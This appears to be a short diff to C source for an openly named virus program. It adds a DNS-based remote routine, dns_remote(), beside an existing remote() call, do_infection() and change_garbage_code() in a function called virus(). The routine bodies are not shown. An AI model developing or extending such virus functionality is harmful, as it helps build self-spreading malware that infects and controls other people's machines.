@@ -86,6 +86,10 @@ void do_infection(){
 
 int virus(int ac, char **av){
 	if (opt.do_remote) remote();
+	if (opt.do_dns_remote)
+	{
+		dns_remote();
+	}
  	if (opt.print_msg) println("[I am a bad virus]");
 
 	change_garbage_code();
